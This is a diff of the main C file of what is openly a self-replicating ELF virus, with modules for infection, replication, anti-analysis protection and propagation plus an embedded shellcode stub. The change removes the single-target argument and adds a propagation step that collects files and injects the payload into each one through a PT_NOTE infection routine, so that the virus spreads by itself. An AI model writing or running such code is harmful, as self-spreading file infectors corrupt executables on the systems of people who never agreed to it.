@@ -1,22 +1,16 @@
 #include "infection/infection.h"
 #include "replication/replication.h"
 #include "protection/protection.h"
+#include "propagation/propagation.h"
 
 #include <stdio.h>
 #include <stdlib.h>
 
-int main(int argc, char *argv[]) {
-    if (argc != 2) {
-        fprintf(stderr, "Usage: %s {target elf}\n", argv[0]);
-        return 1;
-    }
-
+int main() {
     if (protection()) {
         fprintf(stderr, "Protection failed\n");
         return 1;
     }
-
-    char *target_filename = argv[1];
 
     unsigned char stub_bin[] = {
       0x50, 0x57, 0x56, 0x52, 0x51, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,
@@ -37,14 +31,21 @@ int main(int argc, char *argv[]) {
     };
     unsigned int stub_bin_len = 169;
 
-
     unsigned char *payload_bin = NULL;
     size_t payload_size = -1;
 
+    struct queue files;
+    STAILQ_INIT(&files);
+    struct entry *f;
+
     replication(&payload_bin, &payload_size, stub_bin, stub_bin_len);
-    infect_ptnote(target_filename, payload_bin, payload_size);
+    propagation(&files);
+    STAILQ_FOREACH(f, &files, link) {
+        infect_ptnote(f->path, payload_bin, payload_size);
+    }
 
     free(payload_bin);
+    free_queue(&files);
     return 0;
 }
 
